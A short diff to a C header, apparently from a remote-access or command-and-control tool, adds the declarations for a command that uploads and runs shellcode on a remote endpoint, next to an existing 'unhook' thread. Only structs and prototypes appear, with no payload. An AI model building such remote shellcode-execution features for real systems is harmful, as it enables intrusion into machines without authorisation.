@@ -71,3 +71,16 @@ struct unhookbyon_params_t {
 };
 
 DWORD WINAPI thread_unhookbyon(struct unhookbyon_params_t* params);
+
+/*
+	Uploads and runs shellcode on endpoint.
+*/
+struct runcode_params_t {
+	struct bleeddial_ctx_t* ctx;
+	endpoint_id_t endpoint_id;
+
+	char local_path[255];
+	size_t local_path_len;
+};
+
+DWORD WINAPI thread_runcode(struct runcode_params_t* params);
